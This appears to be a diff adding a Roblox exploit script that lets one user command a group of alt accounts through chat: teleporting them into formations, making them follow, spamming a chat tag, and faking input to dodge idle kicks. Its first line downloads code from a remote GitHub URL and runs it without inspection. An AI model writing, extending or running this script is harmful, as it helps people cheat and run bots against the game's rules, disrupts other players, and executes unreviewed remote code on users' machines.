@@ -1,0 +1,184 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/simplealtresources/main/main"))()
+
+local chatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+local messageDoneFiltering = chatEvents:WaitForChild("OnMessageDoneFiltering")
+
+
+local bots = {"1","2","3","4","5","6","7","8","9","10"}
+local allowedusers = {1}
+
+messageDoneFiltering.OnClientEvent:Connect(function(message)
+   local player = game.Players:FindFirstChild(message.FromSpeaker)
+   local message = message.Message or ""
+   
+   if player and table.find(allowedusers, player.UserId) then
+     if tostring(message) == ".bring" then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,2)
+    elseif tostring(message) == ".say" then
+          game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('#simplityontop', 'All')
+    elseif tostring(message) == ".respawn" then
+          game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    elseif tostring(message) == ".shutdown" then
+          game:Shutdown()
+    elseif tostring(message) == ".cube" then
+       _G.Enabled = true
+        while _G.Enabled == true do
+                    if game.Players.LocalPlayer.Name == bots[1] then
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(6,0,6)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[2] then
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-6,0,6)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[3] then
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(6,0,-6)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[4] then
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-6,0,-6)
+                    end
+            task.wait()
+        end
+    elseif tostring(message) == ".wedge" then
+        _G.Enabled = true
+        while _G.Enabled == true do
+                    if game.Players.LocalPlayer.Name == bots[1] then
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(2,0,2)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[2] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-2,0,2)
+                    end
+                    
+                     if game.Players.LocalPlayer.Name == bots[3] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(4,0,4)
+                     end
+                
+                    if game.Players.LocalPlayer.Name == bots[4] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-4,0,4)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[5] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(6,0,6)
+                     end
+                
+                    if game.Players.LocalPlayer.Name == bots[6] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-6,0,6)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[7] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(8,0,8)
+                     end
+                
+                    if game.Players.LocalPlayer.Name == bots[8] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-8,0,8)
+                    end
+                    
+                    if game.Players.LocalPlayer.Name == bots[9] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(8,0,8)
+                     end
+                
+                    if game.Players.LocalPlayer.Name == bots[10] then
+                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-10,0,10)
+                    end
+                    task.wait()
+                end
+    elseif tostring(message) == ".leftwing" then
+        _G.Enabled = true
+      while _G.Enabled == true do
+            if game.Players.LocalPlayer.Name == bots[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-2,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[2] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-4,0,4)
+            end
+            if game.Players.LocalPlayer.Name == bots[3] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-6,0,6)
+            end
+            if game.Players.LocalPlayer.Name == bots[4] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-8,0,8)
+            end
+            if game.Players.LocalPlayer.Name == bots[5] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-10,0,10)
+            end
+       task.wait()
+      end
+              elseif tostring(message) == ".lineup" then
+            if game.Players.LocalPlayer.Name == bots[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(2,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[2] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(4,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[3] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(6,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[4] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(8,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[5] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(10,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[6] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(12,0,2)
+                        end
+            if game.Players.LocalPlayer.Name == bots[7] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(14,0,2)
+                    end
+            if game.Players.LocalPlayer.Name == bots[8] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(16,0,2)
+                    end
+            if game.Players.LocalPlayer.Name == bots[9] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(18,0,2)
+                    end
+            if game.Players.LocalPlayer.Name == bots[10] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(20,0,2)
+            end
+        elseif tostring(message) == ".rightwing" then
+        _G.Enabled = true
+      while _G.Enabled == true do
+            if game.Players.LocalPlayer.Name == bots[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(2,0,2)
+            end
+            if game.Players.LocalPlayer.Name == bots[2] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(4,0,4)
+            end
+            if game.Players.LocalPlayer.Name == bots[3] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(6,0,6)
+            end
+            if game.Players.LocalPlayer.Name == bots[4] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(8,0,8)
+            end
+            if game.Players.LocalPlayer.Name == bots[5] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(10,0,10)
+            end
+       task.wait()
+      end
+    elseif tostring(message) == ".follow" then
+    while _G.Enabled == true do
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,2)
+       task.wait()
+    end
+    elseif tostring(message) == ".savefps" then
+       repeat wait() until game:IsLoaded() 
+    game:GetService("Players").LocalPlayer.Idled:connect(function()
+    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+end)
+setfpscap(5)
+game:GetService('RunService'):Set3dRenderingEnabled(false)
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+    elseif tostring(message) == ".stop" then
+       _G.Enabled = false
+    elseif tostring(message) == ".sit" then
+          game.Players.LocalPlayer.Character.Humanoid.Sit = true
+    elseif tostring(message) == ".jump" then
+          game.Players.LocalPlayer.Character.Humanoid.Jump = true
+          end
+        end
+      end)
